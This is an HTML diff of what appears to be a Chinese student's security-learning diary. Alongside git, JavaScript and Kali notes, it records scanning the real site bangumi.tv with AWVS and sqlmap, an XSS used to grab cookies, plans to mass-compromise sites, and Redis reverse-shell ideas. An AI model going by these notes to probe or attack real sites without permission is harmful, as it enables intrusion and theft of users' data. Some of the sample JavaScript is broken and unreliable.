+			<br>git log和git reflog会记录每一个命令，若反回退可找log中的版本号即可<hr>
+			<br>git设计更优秀的核心:追踪文件的修改而非文件本身
+			<br>工作区与暂存区的概念让git完成对文件修改的追踪从而让速度更快
+			<br>git add会将文件放置在暂存区（此步必要），并将修改保存，再通过git commit提交至仓库
+			<br>若在add后再修改文件内容并commit会导致中间修改未提交
+			<br>注:git bash内核为Linux，可通过vi readme.txt修改文件内容
+			<hr><br>git checkout -- readme.txt可使文件回退至上一次修改的状态(未add)
+			<br>-----git restore readme.txt也可
+			<br><img src="git1.jpg" alt="gitt" title="git"><hr>
+			<br>1.删除文件:rm dl.txt(相当于在工作区用文件管理器删除)<br><img src="git2.jpg">
+			<br>-----------在版本库中删除则可用<code>git rm</code>,此时无法回复，会显示:<br>
+			<code>error: pathspec 'dl.txt' did not match any file(s) known to git</code>
+			<br>2.恢复删除的文件(但必须提交至版本库)<br>
+			<img src="git3.jpg" alt="恢复" title="恢复删除">
+		</div>
+	</div>
+	<hr>
+
+	<div id="11.18">
+		<h2 class="z">11.18</h2>
+		<p>三叶草三面开始了！果不其然是real world的实际渗透挖洞
+		<br>没思路，先用<b class="red">AWVS</b>扫一遍找漏洞吧，之前找bangumi发现没用httponly但用htmlspecialchars转义了基本的特殊字符
+		<br>注:因为我用的破解版，所以被Windows defender自动删了几次配置文件导致没法用，WD真的是😓
+		<br>！！！
+		<br>居然真让AWVS扫出来了XSS漏洞，太有意思了吧！不过看起来很麻烦，现在还没看懂，但确实存在漏洞
+		<br><img src="xss1.jpg" alt="xss" title="xss1">
+		<BR>仔细看了看又测试了下，发现只要将">闭合就可以直接使用JS语句获取cookie或者弹窗，搞不懂的地方在与为什么会有charset这个注入点
+			<br>明明这里是html文件的头文件，用于设定编码格式，例如charset="utf-8"来设置中文编码，怎么会有可控的参数呢？
+			<br>另外能实现的最大前提之一当然是bgm没有用CSP同源策略，允许外部脚本加载了，确实是重大隐患
+			<br>不错，这么快就找到一个洞，接下来看看能不能获得点更高的权限
+		<br>😓呃呃了，居然还对shell的数量有要求，得换个思路批量日站了
+		</p>
+	</div>
+	<hr>
+
+	<div id="11.19">
+		<h2 class="z">11.19</h2>
+		今天没什么进展，御剑扫了下后台但没发现可利用的页面<br>
+		发现浏览器可能对反射型xss有屏蔽，一个外部js脚本使用几次就接受不到cookie了
+		<br>---得多换几次js文件url位置
+		<br>查了下漏洞公布网站但没找到可用的漏洞
+		<br>不对，关键是外国网站漏洞难找，可以用国人建立但服务器在外国国内无备案的网站渗透，这个靠谱一点
+	</div>
+	<hr>
+
+	<div id="11.20">
+		<h2 class="z">11.20</h2>
+		<div class="sql">
+		sqlmap开始:<code><b>python sqlmap.py</b></code>
+		<br>常用语句:-u http://xxxxx  //检测注入点
+			<br>--batch：使用非交互式扫描，SQLMap将不会询问
+			<br>--dbs：获取数据库列表
+			<br>--tables：获取所有的数据表
+			<br>--columns：获取所有字段(列)
+			<br>--dump：获取行数据
+			<br>-D：指定数据库
+			<br>-T：指定数据表
+			<br>-C：指定字段，用逗号间隔
+			<br>--user：当前用户
+			<br>--current-db：当前数据库
+		</div>		
+	</div>
+	<hr>
+
+	<div id="11.21">
+		<h2 class="z">11.21</h2>
+		<div class="sql">
+			好久不看sql注入，几乎忘记了sqlmap的用法了
+			<br>又查了下才想起来sqlmap不是用来直接爆破登录页面，这个得用burp，而是用来<b>找注入点完成sql注入爆数据库的</b>			<br>若某网友有get传参，例如url?id=1，若测试发现?id=1与?id=1'不同，则可能说明该传参插入了php中的sql查询语句，可能存在注入点
+			<br>利用sqlmap的-u url?id=1可进行自动测试，sqlmap会利用这个得知数据库类型(例如mysql,sqlsever)
+			<br>若url中存在多个传参，可用-p id指定注入id这个参数
+			<br>若注不出来，可用-f --level 4 --risk 3提升注入等级，但对web的阻碍也会相应提高
+			<br>若为post型注入，需要用<b class="red">burp抓包获取请求头</b>，保存为txt文件再用sqlmap -r requset.txt -f进行自动注入
+			<br><div class="center"><i class="red">斜体是什么几把</i></div>
+		</div>
+	</div>
+	<hr>
+
+	<div id="11.22">
+		<h2 class="z">11.22</h2>
+		linux文件编辑命令:vi/vim xxx.txt
+		<br>打开文件后输入i进入insert编辑
+		<br>完成后用esc退出至只读模式
+		<br>键入<cide>:wq</cide>保存退出
+		<br>废了半天劲终于搞好了，麻烦啊~
+		<br><img src="kali.jpg" alt="kali" title="kali">
+		<br>总结下安装的教训:1.<b>.vmdk</b>文件为已经安装好的vm虚拟机文件，无需再创建虚拟机，只需打开即可
+		<br>2.设置root用户需要再kali启动页面按E键进入设置
+		<br>3.网络配置需要将虚拟网卡与kali内的内网ip，DNS，网关(再/etc/network处配置)等相对应，但内网IP不能相同
+		<br>-----过了一天又连不上外网了，不知道哪里配置有问题😓
+		<br>4.本机的网络必须设置为共享
+		<br>5.vmtools设置也是必要的，需要<b class="red">先设置共享文件夹</b>，安装完后需要重启.
+		<br>6.kali内置代理软件，只需要改下配置即可实现共用宿主机代理配置
+	</div>
+	<hr>
+
+	<div id="11.23">
+		<h2 class="z">11.23</h2>
+		<h3>未授权访问漏洞</h3>
+		是由外网渗透如服务器的最大漏洞，可直接绕过前端进入后台
+		<br>主要产生原因：<b class="red">为使用某种服务开了端口，但未设置访问限制可能存在getshell的重大漏洞</b>
+		<br><img src="ii.jpg" alt="未授权访问" title="未授权访问漏洞">
+		<br>这种漏洞很危险，可能直接访问数据库，也可能可通过RCE获取信息，最危险的可能是完成<b>反弹shell</b>直接getshell
+		<br>redis应该最常见，通过config命令可直接反弹shell，但经常是写入命令被禁用了，上传后门也是同理
+		<br>MongoDB可访问数据库，但无法提权
+		<br>这种漏洞危险但少见，fofa只能搜索有此服务开发端口的网站，但无法检测出存在该漏洞，只能手动连接测试
+		<br>感觉要用python脚本才行(在实战中很重要)
+		<br>----------三面虽然完成度不高，也算尽力了……
+	</div>
+	<hr>
+
+	<div id="11.24">
+		<h2 class="z">11.24</h2>
+		<div class="xss">
+			<h4>JavaScript基础</h4>
+			DOM是一种将对象树状结构的模型，用来选择<b>JS控制的对象</b>，例如最<b>顶层的对象</b>为window，其下又分document,location,history等等对象
+			例如window.alert控制整个页面，故可省略为alert
+			tips:JS文件常常压缩为.min.js的一行形式来提高浏览器加载速度。
+			利用onomuseover和onmouseout事件可完成图像翻转，例如:<br>
+			<b class="aqua">下图用鼠标点击就会从一色变成阿夸</b>
+			<img src="irowa.jpg" alt="irowa" title="irowa" onclick="this.src='aqua.jpg';alert('Rua!!');"
+			onmouseleave="this.src='irowa.jpg';" /><br>
+			源码如下:
+			<textarea>
+				onclick="this.src='aqua.jpg';alert('rua')" 
+				onmouseleave="this.src='irowa.jpg';"
+			</textarea><br>
+			其中this.src为DOM对象，this为当前图像，指明所控制的对象为当前模块，src为路径.
+			JS中函数的知识与C中非常相似，例如用return x;传递数据。
+			不同的地方在于JS中无法像C那样在函数代码块中定义<b>块级作用域</b>(例如for(){int a;xxx;xx;}，a只在for内有定义)
+			但js也同样可以，但需要用let定义变量而非var，例如
+			<pre>
+				function fun(x){
+					var x=y;
+					if(x>50)
+					{
+						<b class="green">let</b> y=10;
+						alert("y="+y);	
+					}
+					alert("y="+y);
+				}
+				fun(x);
+			</pre>
+			当x=100时第二个弹窗会显示y=100，因为<b class="green">let赋值变量只在块内生效</b>，离开if后y的值仍然是100
+			但若将let换为var，第二个会弹窗y=10，因为var赋值在整个函数内都生效
+		</div>
+	</div>
+	<hr>
+
+	<div id="11.25">
+		<h2 class="z">11.25</h2>
+		<div class="xss">
+			<h3>DOM内置对象和属性</h3>
+			1.对象：document.<big>getElementById("divexp")</big>,，用于选择页面中由id标记的div
+			<br>document.getElementById("divexp")【方法】.innerHTML【属性】="<'p'>xxxxxxxxxxxxxxxxxxx<'/p'>";
+			<br>该属性可用xxxxxxxxxxxxxxx代替之前divexp的html内容<br>
+
+			<br>2.history对象为访问过的url列表(历史记录)，只有一个属性:length,表示用户所访问过的页面的数量(为一个数)
+			<br>有三个方法:forward(),backward(),go(x)，分别表示前进后退和跳转盗历史记录列表里的相对位置(数量)
+			<br>go("baidu.com")可跳转至指定url
+			<br>例如:<button onclick="alert('你已经访问了' + history.length + '个页面了');">点这里得知你已经访问了多少页面</button>
+
+			<br><br>3.location对象可获取当前页面url信息
+			<br>例如:<button onclick="alert('当前页面url为'+location.href)">点这里得知当前url</button><br>
+
+			<br>4.日期与事件，DOM中无现成日期对象，需要自己创建
+			<br><button onclick="date">点此查看日期</button>
+			<script>
+				function date(){
+					new Date(milliseconds);
+					var mydata=Date();
+					alert("Today is "+mydate());
+				}
+			</script>
+		</div>
+	</div>
+	<hr>
+
+	<div id="11.26">
+		<h2 class="z">11.26</h2>
+		<div class="sql">
+			sqlmap确实好用，用<code>python sqlmap.py -u https://bangumi.tv/ --forms --crawl=2</code>可自动扫描是否有可控的get变量
+			<br>post变量则需要复制请求头用SQLmap打开.
+		</div>
+	</div>
+	<hr>
+
+	<div id="11.27">
+		<h2 class="z">11.27</h2>
+		<div class="git">
+			Git连接远程库：<code>git remote add origin git@server-name:path/repo-name.git</code>
+			<br>我用ssh连接多用<code>git remote add origin git@github.com:username/reponame.git</code>
+			<br>注：前提为将本地的ssh公钥加入github
+			<br><img src="ssh.jpg" alt="ssh" title="ssh">
+			<br>关联远程库后需要给此库指定名，默认为origin
+			<br>第一次关联需要用<b>git push -u origin main</b>一次性推送main分支所有内容
+			<br>其他只要用<b>git push origin main</b>推出最新修改即可
+			<br>注:廖雪峰的教程写的是git push origin master,不过我试了下需要用github提示里的git push origin main才行
+			<br>----若在github远程修改过则需要先pull到本地，否则也可用强制push(会覆盖远程修改的内容)
+			<br>----<b>git push -u origin main <i class="red">-f</i></b><br>
+			Git克隆到本地:<code class="red"> git clone git@github.com:Yukiyoruko/cloud.git</code>
+			<br>会在本地新建一个cloud文件夹，其中有该库内的文件。
+			<h4>分支</h4>
+			查看分支：git branch
+			<br>创建分支：<name>git branch </name>
+			<br>切换分支：<name>git checkout</name>或者<name>git switch</name>
+			<br>创建+切换分支：<name>git checkout -b </name>或者<name>git switch -c </name>
+			<br>合并某分支到当前分支：<name>git merge </name>
+			<br>删除分支：<name>git branch -d </name>
+		</div>
+	</div>	
+	<hr>
+
+	<div id="11.28">
+		<h2 class="z">11.28</h2>
+		
+
+	</div>
+
+
+
+
+	<footer>
+		<br><br><br><br><br><br>
+		<h2 class="demo1">
+		现在已经是
+		<span id="time">&nbsp;</span>
+		了，你学会什么东西了吗？
+		</h2>
+	</footer>
+</body>
+</html>
